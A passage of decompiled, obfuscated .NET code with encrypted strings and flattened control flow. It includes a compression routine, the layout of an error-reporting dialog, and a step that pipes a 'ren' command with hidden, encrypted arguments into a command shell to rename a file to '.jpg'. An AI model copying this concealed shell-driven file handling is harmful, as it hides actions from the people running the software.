        num2 = 43;
        StreamWriter streamWriter5 = standardInput;
        strArray2 = new string[8]
        {
          "ren \"",
          str7,
          \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA=="),
          "\\",
          \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw=="),
          ".jpg\" ",
          \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw=="),
          Environment.NewLine
        };
        string str16 = string.Concat(strArray2);
        streamWriter5.Write(str16);
label_41:
        num2 = 45;
        standardInput.Write("exit" + Environment.NewLine);
label_42:
        num2 = 46;
        process.WaitForExit();
label_43:
        num2 = 47;
        process.Kill();
label_44:
        num2 = 48;
        standardInput.Flush();
        goto label_50;
label_46:
        num3 = num2;
        switch (num1)
        {
          case 1:
            int num4 = num3 + 1;
            num3 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_20;
              case 22:
                goto label_21;
              case 23:
                goto label_22;
              case 24:
                goto label_23;
              case 25:
                goto label_24;
              case 26:
              case 40:
              case 41:
                goto label_38;
              case 27:
                goto label_25;
              case 28:
                goto label_26;
              case 29:
                goto label_27;
              case 30:
                goto label_28;
              case 31:
                goto label_29;
              case 32:
                goto label_30;
              case 33:
                goto label_31;
              case 34:
                goto label_32;
              case 35:
                goto label_33;
              case 36:
                goto label_34;
              case 37:
                goto label_35;
              case 38:
                goto label_36;
              case 39:
                goto label_37;
              case 42:
                goto label_39;
              case 43:
                goto label_40;
              case 44:
              case 45:
                goto label_41;
              case 46:
                goto label_42;
              case 47:
                goto label_43;
              case 48:
                goto label_44;
              case 49:
                goto label_50;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num3 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_46;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_50:
      if (num3 == 0)
        return;
      ProjectData.ClearProjectError();
    }
    catch (Exception ex)
    {
      object obj;
      object[] objArray6 = new object[24]
      {
        executablePath,
        (object) str5,
        (object) str3,
        (object) standardInput,
        (object) str8,
        (object) str6,
        (object) str7,
        (object) str2,
        (object) str1,
        (object) process,
        (object) str4,
        obj,
        (object) str9,
        (object) str10,
        objectValue2,
        Instance1,
        objectValue1,
        (object) strArray1,
        (object) objArray1,
        (object) objArray2,
        (object) strArray2,
        (object) num1,
        (object) num3,
        (object) num2
      };
      \u0023\u0023.\u0023ji(ex, objArray6);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023bl([In] \u0023hf obj0) => obj0.\u0023ef;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023cl([In] \u0023hf obj0, [In] bool obj1) => obj0.\u0023ff = obj1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023dl([In] \u0023qc.\u0023Jd obj0)
  {
    int length;
    try
    {
      int num1;
      if (obj0.\u0023Cd >= 65274)
      {
        if (true)
        {
          num1 = 0;
          goto label_12;
        }
      }
      else
        goto label_6;
label_2:
      \u0023\u0023.\u0023qj(obj0);
label_6:
      int num2;
      if (obj0.\u0023Dd < 262 && obj0.\u0023Gd < obj0.\u0023Hd)
      {
        length = 65536 - obj0.\u0023Dd - obj0.\u0023Cd;
        if (length > obj0.\u0023Hd - obj0.\u0023Gd)
          length = obj0.\u0023Hd - obj0.\u0023Gd;
        Array.Copy((Array) obj0.\u0023Ed, obj0.\u0023Gd, (Array) obj0.\u0023Hc, obj0.\u0023Cd + obj0.\u0023Dd, length);
        num2 = 2;
      }
      else
      {
        if (obj0.\u0023Dd < 3)
          return;
        num2 = 6;
      }
label_11:
      num1 = num2;
label_12:
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_2;
          case 1:
          case 2:
            obj0.\u0023Gd += length;
            goto case 4;
          case 3:
          case 5:
            goto label_6;
          case 4:
            obj0.\u0023Fd += length;
            obj0.\u0023Dd += length;
            num1 = 5;
            continue;
          case 6:
            goto label_14;
          default:
            goto label_13;
        }
      }
label_13:
      num2 = 4;
      goto label_11;
label_14:
      \u0023\u0023.\u0023el(obj0);
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local = (ValueType) length;
      \u0023qc.\u0023Jd jd = obj0;
      \u0023\u0023.\u0023Jk(ex, (object) local, (object) jd);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023el([In] \u0023qc.\u0023Jd obj0)
  {
    try
    {
      obj0.\u0023vd = (int) obj0.\u0023Hc[obj0.\u0023Cd] << 5 ^ (int) obj0.\u0023Hc[obj0.\u0023Cd + 1];
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Jd jd = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) jd);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023fl([In] bool obj0, [In] \u0023qc.\u0023Jd obj1, [In] bool obj2)
  {
label_0:
    bool flag1;
    bool flag2;
    try
    {
      \u0023\u0023.\u0023dl(obj1);
      int num1;
      if (obj2)
      {
        num1 = 3;
        goto label_8;
      }
      else
        goto label_6;
label_2:
      int num2;
      if (\u0023\u0023.\u0023vk(obj1.\u00239c))
      {
        if (!flag1)
        {
          num2 = 4;
          if (true)
            goto label_9;
        }
        else
          goto label_0;
      }
      else
        goto label_11;
label_5:
      int num3 = obj1.\u0023Gd == obj1.\u0023Hd ? 1 : 0;
      goto label_7;
label_6:
      num3 = 0;
label_7:
      flag2 = num3 != 0;
      flag1 = \u0023\u0023.\u0023ik(flag2, obj1, obj0);
      goto label_2;
label_8:
      num2 = num1;
label_9:
      switch (num2)
      {
        case 0:
        case 3:
          goto label_5;
        case 1:
        case 2:
          goto label_2;
        case 4:
          break;
        default:
          num1 = 2;
          goto label_8;
      }
label_11:
      return flag1;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<bool> local1 = (ValueType) flag1;
      // ISSUE: variable of a boxed type
      __Boxed<bool> local2 = (ValueType) flag2;
      \u0023qc.\u0023Jd jd = obj1;
      // ISSUE: variable of a boxed type
      __Boxed<bool> local3 = (ValueType) obj2;
      // ISSUE: variable of a boxed type
      __Boxed<bool> local4 = (ValueType) obj0;
      \u0023\u0023.\u0023mk(ex, (object) local1, (object) local2, (object) jd, (object) local3, (object) local4);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023gl([In] \u0023of obj0, [In] \u0023ge obj1)
  {
    int num1 = 5;
    if (true)
      goto label_7;
label_1:
    \u0023of of1 = obj1.\u0023fe;
    int num2 = 2;
label_6:
    num1 = num2;
label_7:
    \u0023of comparand;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 5:
          goto label_1;
        case 1:
        case 2:
          comparand = of1;
          if (true)
          {
            num1 = 4;
            continue;
          }
          goto case 4;
        case 3:
          if (of1 != comparand)
            goto case 1;
          else
            goto label_3;
        case 4:
          \u0023of of2 = comparand + obj0;
          of1 = Interlocked.CompareExchange<\u0023of>(ref obj1.\u0023fe, of2, comparand);
          goto case 3;
        case 6:
          goto label_10;
        default:
          if (true)
          {
            num1 = 3;
            continue;
          }
          goto label_9;
      }
    }
label_3:
    num2 = 6;
    goto label_6;
label_10:
    return;
label_9:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023hl([In] object obj0)
  {
    string empty;
    try
    {
      int num1;
      int num2;
      switch (obj0)
      {
        case null:
          empty = string.Empty;
          if (true)
          {
            num2 = 7;
            goto label_7;
          }
          else
            goto label_21;
        case int _:
          num1 = 4;
          break;
        case long num3:
          empty = num3.ToString("x");
          goto label_21;
        case short _:
          num1 = 2;
          break;
        case uint num4:
          empty = num4.ToString("x");
          if (true)
          {
            num2 = 10;
            goto label_7;
          }
          else
            goto label_21;
        case ulong num5:
          empty = num5.ToString("x");
          goto label_21;
        case ushort num6:
          empty = num6.ToString("x");
          if (true)
          {
            num2 = 1;
            goto label_7;
          }
          else
            goto label_21;
        case byte num7:
          empty = num7.ToString("x");
          goto label_21;
        case sbyte num8:
          empty = num8.ToString("x");
          num1 = 9;
          break;
        case IntPtr num9:
          num1 = 5;
          break;
        case UIntPtr num10:
          num1 = 8;
          break;
        default:
          goto label_20;
      }
label_6:
      num2 = num1;
label_7:
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 3:
          case 6:
          case 7:
          case 9:
          case 10:
          case 11:
            goto label_21;
          case 2:
            goto label_12;
          case 4:
            goto label_15;
          case 5:
            goto label_10;
          case 8:
            empty = num10.ToUInt64().ToString("x");
            if (true)
            {
              num2 = 11;
              continue;
            }
            goto label_21;
          default:
            goto label_8;
        }
      }
label_8:
      num1 = 3;
      goto label_6;
label_10:
      empty = num9.ToInt64().ToString("x");
      goto label_21;
label_12:
      empty = ((short) obj0).ToString("x");
      goto label_21;
label_15:
      empty = ((int) obj0).ToString("x");
      goto label_21;
    }
    catch
    {
    }
label_20:
    return string.Empty;
label_21:
    return empty;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023il([In] \u0023Qh obj0)
  {
    int num1 = 1;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 9:
            obj0.\u0023vh = new CheckBox();
            obj0.\u0023th = new TextBox();
            obj0.\u0023rh = new \u00232f();
            obj0.\u0023qh = new Label();
            obj0.\u0023sh = new Button();
            obj0.\u00238f = new \u00238f();
            obj0.\u0023xh = new Button();
            obj0.\u0023bh.SuspendLayout();
            obj0.\u0023ch.SuspendLayout();
            obj0.\u0023ph.SuspendLayout();
            int num3 = 65;
            num2 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num3 : num3;
            continue;
          case 1:
            obj0.\u0023bh = new Panel();
            num2 = 43;
            continue;
          case 2:
            obj0.\u0023kh = new Button();
            obj0.\u0023eh = new \u0023dg();
            if (true)
            {
              num2 = 41;
              continue;
            }
            goto label_35;
          case 3:
            obj0.\u0023xh.Name = "saveReport";
            int num4 = 37;
            num2 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num4 : num4;
            continue;
          case 4:
            goto label_2;
          case 5:
            obj0.\u0023rh.TabIndex = 3;
            obj0.\u0023rh.TabStop = false;
            ((Control) obj0.\u0023rh).Text = "Do you want to be contacted by %CompanyName% regarding this problem?";
            obj0.\u0023qh.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            obj0.\u0023qh.FlatStyle = FlatStyle.System;
            obj0.\u0023qh.Location = new Point(20, 69);
            obj0.\u0023qh.Name = "label3";
            if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
            {
              num2 = 58;
              continue;
            }
            goto case 52;
          case 6:
            goto label_58;
          case 7:
            goto label_17;
          case 8:
            goto label_66;
          case 10:
            obj0.\u0023rf.Location = new Point(20, 69);
            if (true)
            {
              num2 = 24;
              continue;
            }
            goto case 35;
          case 11:
            obj0.\u0023ih = new \u0023Uf();
            obj0.\u0023ph = new Panel();
            obj0.\u0023uh = new Label();
            if (true)
            {
              num2 = 0;
              continue;
            }
            goto case 5;
          case 12:
            obj0.\u00238f.Location = new Point(6, 730);
            obj0.\u00238f.Name = "poweredBy";
            obj0.\u00238f.Size = new Size(112, 32);
            obj0.\u00238f.TabIndex = 5;
            obj0.\u00238f.TabStop = false;
            if (true)
            {
              num2 = 20;
              continue;
            }
            goto case 66;
          case 13:
            goto label_47;
          case 14:
            obj0.\u0023dh.Text = "&Cancel";
            obj0.\u0023dh.Click += new EventHandler(obj0.\u0023Bh);
            obj0.\u0023jh.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            num2 = 40;
            continue;
          case 15:
            obj0.\u0023uh.Name = "labelEmail";
            num2 = 27;
            continue;
          case 16:
            goto label_16;
          case 17:
            obj0.BackColor = SystemColors.Window;
            obj0.ClientSize = new Size(434, 768);
            obj0.ControlBox = false;
            obj0.Controls.Add((Control) obj0.\u00238f);
            obj0.Controls.Add((Control) obj0.\u0023ph);
            obj0.Controls.Add((Control) obj0.\u0023bh);
            obj0.Controls.Add((Control) obj0.\u0023ch);
            if (true)
            {
              num2 = 23;
              continue;
            }
            goto case 12;
          case 18:
            goto label_3;
          case 19:
            goto label_24;
          case 20:
            goto label_65;
          case 21:
            goto label_36;
          case 22:
            goto label_56;
          case 23:
            obj0.FormBorderStyle = FormBorderStyle.FixedSingle;
            obj0.Name = "ExceptionReportingForm";
            if (true)
            {
              num2 = 30;
              continue;
            }
            goto label_60;
          case 24:
            goto label_31;
          case 25:
            obj0.\u0023wh.Location = new Point(136, 205);
            obj0.\u0023wh.Name = "saveAsFile";
            obj0.\u0023wh.Size = new Size(72, 24);
            obj0.\u0023wh.TabIndex = 11;
            num2 = 55;
            continue;
          case 26:
            obj0.\u0023vh.Size = new Size(232, 16);
            obj0.\u0023vh.TabIndex = 11;
            if (true)
            {
              num2 = 29;
              continue;
            }
            goto label_73;
          case 27:
            obj0.\u0023uh.Size = new Size(100, 16);
            int num5 = 44;
            num2 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num5 : num5;
            continue;
          case 28:
            obj0.\u0023ph.Size = new Size(413, 232);
            obj0.\u0023ph.TabIndex = 4;
            obj0.\u0023ph.Visible = false;
            obj0.\u0023uh.FlatStyle = FlatStyle.System;
            obj0.\u0023uh.Location = new Point(20, 131);
            if (true)
            {
              num2 = 15;
              continue;
            }
            goto case 11;
          case 29:
            goto label_57;
          case 30:
            obj0.ShowInTaskbar = false;
            obj0.StartPosition = FormStartPosition.CenterScreen;
            obj0.Text = "%AppName%";
            obj0.TopMost = true;
            obj0.\u0023bh.ResumeLayout(false);
            obj0.\u0023ch.ResumeLayout(false);
            obj0.\u0023ph.ResumeLayout(false);
            obj0.\u0023ph.PerformLayout();
            obj0.ResumeLayout(false);
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            {
              num2 = 70;
              continue;
            }
            goto label_70;
          case 31:
            goto label_49;
          case 32:
            obj0.\u0023th.Size = new Size(256, 20);
            obj0.\u0023th.TabIndex = 10;
            obj0.\u0023th.TextChanged += new EventHandler(obj0.\u0023Mh);
            obj0.\u0023rh.BackColor = System.Drawing.Color.FromArgb(36, 96, 179);
            obj0.\u0023rh.Dock = DockStyle.Top;
            obj0.\u0023rh.ForeColor = System.Drawing.Color.White;
            \u0023\u0023.\u00231j(obj0.\u0023rh, \u0023Zf.\u0023We);
            \u0023\u0023.\u00230h((Image) null, obj0.\u0023rh);
            obj0.\u0023rh.Location = new Point(0, 0);
            obj0.\u0023rh.Name = "headerControl3";
            obj0.\u0023rh.Size = new Size(413, 58);
            if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
            {
              num2 = 5;
              continue;
            }
            goto label_56;
          case 33:
            goto label_33;
          case 34:
            obj0.\u0023kh.Size = new Size(80, 24);
            obj0.\u0023kh.TabIndex = 23;
            if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
            {
              num2 = 61;
              continue;
            }
            goto label_65;
          case 35:
            obj0.\u0023ch.TabIndex = 2;
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            {
              num2 = 16;
              continue;
            }
            goto label_52;
          case 36:
            obj0.\u0023ph.Controls.Add((Control) obj0.\u0023vh);
            obj0.\u0023ph.Controls.Add((Control) obj0.\u0023th);
            obj0.\u0023ph.Controls.Add((Control) obj0.\u0023rh);
            obj0.\u0023ph.Controls.Add((Control) obj0.\u0023qh);
            obj0.\u0023ph.Controls.Add((Control) obj0.\u0023sh);
            obj0.\u0023ph.Location = new Point(11, 512);
            obj0.\u0023ph.Name = "panelEmail";
            if (true)
            {
              num2 = 28;
              continue;
            }
            goto label_15;
          case 37:
            goto label_21;
          case 38:
            goto label_67;
          case 39:
            goto label_7;
          case 40:
            goto label_60;
          case 41:
            goto label_42;
          case 42:
            goto label_22;
          case 43:
            obj0.\u0023nh = new Button();
            obj0.\u00237g = new CheckBox();
            obj0.\u00238g = new Label();
            obj0.\u00239g = new Button();
            obj0.\u0023Se = new Button();
            obj0.\u0023ah = new Label();
            num2 = 53;
            continue;
          case 44:
            obj0.\u0023uh.TabIndex = 9;
            obj0.\u0023uh.Text = "&Email address:";
            obj0.\u0023vh.FlatStyle = FlatStyle.System;
            if (true)
            {
              num2 = 69;
              continue;
            }
            goto case 26;
          case 45:
            goto label_52;
          case 46:
            obj0.\u0023ch.Controls.Add((Control) obj0.\u0023xh);
            obj0.\u0023ch.Controls.Add((Control) obj0.\u0023dh);
            num2 = 6;
            continue;
          case 47:
            goto label_35;
          case 48:
            goto label_23;
          case 49:
            goto label_28;
          case 50:
            obj0.AutoScaleBaseSize = new Size(5, 13);
            num2 = 17;
            continue;
          case 51:
          case 62:
            goto label_44;
          case 52:
            obj0.\u0023nh.Text = "Debug";
            obj0.\u0023nh.Visible = false;
            obj0.\u0023nh.Click += new EventHandler(obj0.\u0023Kh);
            obj0.\u00237g.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
            obj0.\u00237g.FlatStyle = FlatStyle.System;
            obj0.\u00237g.Location = new Point(22, 99);
            num2 = 64;
            continue;
          case 53:
            goto label_68;
          case 54:
            goto label_70;
          case 55:
            goto label_1;
          case 56:
            goto label_29;
          case 57:
            goto label_5;
          case 58:
            goto label_30;
          case 59:
            goto label_48;
          case 60:
            goto label_18;
          case 61:
            goto label_27;
          case 63:
            goto label_4;
          case 64:
            goto label_32;
          case 65:
            obj0.SuspendLayout();
            obj0.\u0023bh.Controls.Add((Control) obj0.\u0023nh);
            num2 = 31;
            continue;
          case 66:
            obj0.\u0023jh.Text = "&OK";
            if (true)
            {
              num2 = 33;
              continue;
            }
            goto case 36;
          case 67:
            goto label_8;
          case 68:
            goto label_15;
          case 69:
            goto label_41;
          case 70:
            goto label_54;
          default:
            if (true)
            {
              num2 = 49;
              continue;
            }
            goto case 34;
        }
      }
label_1:
      obj0.\u0023wh.Text = "Save as &File";
      obj0.\u0023wh.Click += new EventHandler(obj0.\u0023Oh);
      num1 = 46;
      continue;
label_2:
      obj0.\u00238f.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
      obj0.\u00238f.Cursor = Cursors.Hand;
      num1 = 12;
      continue;
label_3:
      obj0.\u00237g.CheckedChanged += new EventHandler(obj0.\u0023Dh);
      obj0.\u00238g.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      num1 = 48;
      continue;
label_4:
      obj0.\u0023rf.Size = new Size(381, 13);
      num1 = 22;
      continue;
label_5:
      obj0.\u0023ah.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      obj0.\u0023ah.FlatStyle = FlatStyle.System;
      obj0.\u0023ah.Location = new Point(20, 140);
      obj0.\u0023ah.Name = "pleaseTellMessage";
      obj0.\u0023ah.Size = new Size(381, 55);
      obj0.\u0023ah.TabIndex = 12;
      obj0.\u0023ah.Text = "To help improve the software you use, %CompanyName% is interested in learning more about this error. We have created a report about the error for you to send to us.";
      obj0.\u0023lh.BackColor = System.Drawing.Color.FromArgb(36, 96, 179);
      obj0.\u0023lh.Dock = DockStyle.Top;
      obj0.\u0023lh.ForeColor = System.Drawing.Color.White;
      \u0023\u0023.\u00231j(obj0.\u0023lh, \u0023Zf.\u0023We);
      \u0023\u0023.\u00230h((Image) null, obj0.\u0023lh);
      obj0.\u0023lh.Location = new Point(0, 0);
      obj0.\u0023lh.Name = "headerControl1";
      obj0.\u0023lh.Size = new Size(413, 58);
      obj0.\u0023lh.TabIndex = 3;
      obj0.\u0023lh.TabStop = false;
      ((Control) obj0.\u0023lh).Text = "%AppName% has encountered a problem.\nWe are sorry for the inconvenience.";
      obj0.\u0023rf.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
      obj0.\u0023rf.FlatStyle = FlatStyle.System;
      num1 = 10;
      continue;
label_7:
      obj0.\u00238g.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      obj0.\u00238g.Location = new Point(20, 124);
      obj0.\u00238g.Name = "pleaseTellTitle";
      num1 = 68;
      continue;
label_8:
      obj0.\u0023bh.Controls.Add((Control) obj0.\u00239g);
      obj0.\u0023bh.Controls.Add((Control) obj0.\u0023Se);
      obj0.\u0023bh.Controls.Add((Control) obj0.\u0023ah);
      obj0.\u0023bh.Controls.Add((Control) obj0.\u0023lh);
      obj0.\u0023bh.Controls.Add((Control) obj0.\u0023rf);
      num1 = 60;
      continue;
label_15:
      obj0.\u00238g.Size = new Size(381, 16);
      obj0.\u00238g.TabIndex = 11;
      obj0.\u00238g.Text = "Please tell %CompanyName% about this problem.";
      obj0.\u00239g.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      obj0.\u00239g.FlatStyle = FlatStyle.System;
      obj0.\u00239g.Location = new Point(325, 205);
      obj0.\u00239g.Name = "dontSendReport";
      obj0.\u00239g.Size = new Size(75, 24);
      obj0.\u00239g.TabIndex = 6;
      num1 = 56;
      continue;
label_16:
      obj0.\u0023ch.Visible = false;
      obj0.\u0023dh.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      obj0.\u0023dh.FlatStyle = FlatStyle.System;
      obj0.\u0023dh.Location = new Point(320, 197);
      obj0.\u0023dh.Name = "cancelSending";
      obj0.\u0023dh.Size = new Size(80, 24);
      obj0.\u0023dh.TabIndex = 10;
      num1 = 14;
      continue;
label_17:
      obj0.\u0023xh.Text = "&Save Report";
      obj0.\u0023xh.Visible = false;
      obj0.\u0023xh.Click += new EventHandler(obj0.\u0023Ph);
      num1 = 50;
      continue;
label_18:
      obj0.\u0023bh.Controls.Add((Control) obj0.\u0023wh);
      obj0.\u0023bh.Location = new Point(8, 8);
      obj0.\u0023bh.Name = "panelInformation";
      obj0.\u0023bh.Size = new Size(413, 240);
      obj0.\u0023bh.TabIndex = 0;
      obj0.\u0023nh.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      obj0.\u0023nh.FlatStyle = FlatStyle.System;
      obj0.\u0023nh.Location = new Point(66, 205);
      obj0.\u0023nh.Name = "debug";
      obj0.\u0023nh.Size = new Size(64, 24);
      obj0.\u0023nh.TabIndex = 13;
      num1 = 52;
      continue;
label_21:
      obj0.\u0023xh.Size = new Size(80, 24);
      obj0.\u0023xh.TabIndex = 25;
      num1 = 7;
      continue;
label_22:
      obj0.\u0023mh.BackColor = System.Drawing.Color.FromArgb(36, 96, 179);
      obj0.\u0023mh.Dock = DockStyle.Top;
      obj0.\u0023mh.ForeColor = System.Drawing.Color.White;
      \u0023\u0023.\u00231j(obj0.\u0023mh, \u0023Zf.\u0023We);
      \u0023\u0023.\u00230h((Image) null, obj0.\u0023mh);
      obj0.\u0023mh.Location = new Point(0, 0);
      obj0.\u0023mh.Name = "headerControl2";
      obj0.\u0023mh.Size = new Size(413, 58);
      obj0.\u0023mh.TabIndex = 24;
      obj0.\u0023mh.TabStop = false;
      ((Control) obj0.\u0023mh).Text = "Please wait while %AppName% is sending the report to %CompanyName% through the Internet.";
      obj0.\u0023fh.Location = new Point(24, 72);
      obj0.\u0023fh.Name = "preparingFeedback";
      obj0.\u0023fh.Size = new Size(368, 16);
      obj0.\u0023fh.TabIndex = 18;
      obj0.\u0023fh.TabStop = false;
      ((Control) obj0.\u0023fh).Text = "Preparing the error report.";
      obj0.\u0023gh.Location = new Point(24, 96);
      obj0.\u0023gh.Name = "connectingFeedback";
      obj0.\u0023gh.Size = new Size(368, 16);
      obj0.\u0023gh.TabIndex = 19;
      obj0.\u0023gh.TabStop = false;
      ((Control) obj0.\u0023gh).Text = "Connecting to server.";
      num1 = 13;
      continue;
label_23:
      obj0.\u00238g.FlatStyle = FlatStyle.System;
      num1 = 39;
      continue;
label_24:
      obj0.\u0023ih.Name = "completedFeedback";
      obj0.\u0023ih.Size = new Size(368, 16);
      obj0.\u0023ih.TabIndex = 21;
      obj0.\u0023ih.TabStop = false;
      ((Control) obj0.\u0023ih).Text = "Error reporting completed. Thank you.";
      obj0.\u0023ph.Controls.Add((Control) obj0.\u0023uh);
      num1 = 36;
      continue;
label_27:
      obj0.\u0023kh.Text = "&Retry";
      obj0.\u0023kh.Visible = false;
      obj0.\u0023kh.Click += new EventHandler(obj0.\u0023Ih);
      obj0.\u0023eh.Location = new Point(87, 145);
      obj0.\u0023eh.Name = "waitSendingReport";
      obj0.\u0023eh.Size = new Size(250, 42);
      obj0.\u0023eh.TabIndex = 11;
      obj0.\u0023eh.TabStop = false;
      obj0.\u0023eh.Visible = false;
      num1 = 42;
      continue;
label_28:
      obj0.\u0023jh.Name = "ok";
      obj0.\u0023jh.Size = new Size(80, 24);
      obj0.\u0023jh.TabIndex = 22;
      num1 = 66;
      continue;
label_29:
      obj0.\u00239g.Text = "&Don't Send";
      obj0.\u00239g.Click += new EventHandler(obj0.\u0023Ah);
      obj0.\u0023Se.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      obj0.\u0023Se.FlatStyle = FlatStyle.System;
      obj0.\u0023Se.Location = new Point(214, 205);
      obj0.\u0023Se.Name = "sendReport";
      obj0.\u0023Se.Size = new Size(105, 24);
      num1 = 54;
      continue;
label_30:
      obj0.\u0023qh.Size = new Size(381, 43);
      obj0.\u0023qh.TabIndex = 10;
      obj0.\u0023qh.Text = "If you want to be contacted by %CompanyName% regarding this error, please provide your e-mail address. This information will not be used for any other purpose.";
      num1 = 45;
      continue;
label_31:
      obj0.\u0023rf.Name = "errorMessage";
      num1 = 63;
      continue;
label_32:
      obj0.\u00237g.Name = "continueCheckBox";
      obj0.\u00237g.Size = new Size(226, 16);
      obj0.\u00237g.TabIndex = 14;
      obj0.\u00237g.Text = "Ignore this error and attempt to &continue.";
      num1 = 18;
      continue;
label_33:
      obj0.\u0023jh.Click += new EventHandler(obj0.\u0023Ch);
      obj0.\u0023kh.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      obj0.\u0023kh.FlatStyle = FlatStyle.System;
      obj0.\u0023kh.Location = new Point(144, 197);
      obj0.\u0023kh.Name = "retrySending";
      num1 = 34;
      continue;
label_35:
      obj0.\u0023hh = new \u0023Uf();
      num1 = 11;
      continue;
label_36:
      obj0.\u0023ih.Location = new Point(24, 144);
      num1 = 19;
      continue;
label_41:
      obj0.\u0023vh.Location = new Point(120, 160);
      num1 = 62;
      continue;
label_42:
      obj0.\u0023mh = new \u00232f();
      obj0.\u0023fh = new \u0023Uf();
      obj0.\u0023gh = new \u0023Uf();
      num1 = 47;
      continue;
label_44:
      obj0.\u0023vh.Name = "sendAnonymously";
      num1 = 26;
      continue;
label_47:
      obj0.\u0023hh.Location = new Point(24, 120);
      num1 = 59;
      continue;
label_48:
      obj0.\u0023hh.Name = "transferingFeedback";
      obj0.\u0023hh.Size = new Size(368, 16);
      obj0.\u0023hh.TabIndex = 20;
      obj0.\u0023hh.TabStop = false;
      ((Control) obj0.\u0023hh).Text = "Transferring report.";
      num1 = 21;
      continue;
label_49:
      obj0.\u0023bh.Controls.Add((Control) obj0.\u00237g);
      obj0.\u0023bh.Controls.Add((Control) obj0.\u00238g);
      num1 = 67;
      continue;
label_52:
      obj0.\u0023sh.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      obj0.\u0023sh.Enabled = false;
      obj0.\u0023sh.FlatStyle = FlatStyle.System;
      obj0.\u0023sh.Location = new Point(295, 197);
      obj0.\u0023sh.Name = "continueSendReport";
      obj0.\u0023sh.Size = new Size(105, 24);
      obj0.\u0023sh.TabIndex = 12;
      obj0.\u0023sh.Text = "&Send Error Report";
      obj0.\u0023sh.Click += new EventHandler(obj0.\u0023Lh);
      num1 = 4;
      continue;
label_56:
      obj0.\u0023rf.TabIndex = 10;
      obj0.\u0023rf.Text = "errorMessage";
      obj0.\u0023rf.UseMnemonic = false;
      obj0.\u0023wh.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      obj0.\u0023wh.FlatStyle = FlatStyle.System;
      num1 = 25;
      continue;
label_57:
      obj0.\u0023vh.Text = "I prefer to send this report &anonymously.";
      obj0.\u0023vh.CheckedChanged += new EventHandler(obj0.\u0023Nh);
      obj0.\u0023th.Location = new Point(120, 128);
      obj0.\u0023th.Name = "email";
      num1 = 32;
      continue;
label_58:
      obj0.\u0023ch.Controls.Add((Control) obj0.\u0023jh);
      obj0.\u0023ch.Controls.Add((Control) obj0.\u0023kh);
      obj0.\u0023ch.Controls.Add((Control) obj0.\u0023eh);
      obj0.\u0023ch.Controls.Add((Control) obj0.\u0023mh);
      obj0.\u0023ch.Controls.Add((Control) obj0.\u0023fh);
      obj0.\u0023ch.Controls.Add((Control) obj0.\u0023gh);
      obj0.\u0023ch.Controls.Add((Control) obj0.\u0023hh);
      obj0.\u0023ch.Controls.Add((Control) obj0.\u0023ih);
      obj0.\u0023ch.Location = new Point(8, 264);
      obj0.\u0023ch.Name = "panelSending";
      obj0.\u0023ch.Size = new Size(413, 232);
      num1 = 35;
      continue;
label_60:
      obj0.\u0023jh.Enabled = false;
      obj0.\u0023jh.FlatStyle = FlatStyle.System;
      obj0.\u0023jh.Location = new Point(232, 197);
      goto label_28;
label_65:
      obj0.\u00238f.Text = "poweredBy1";
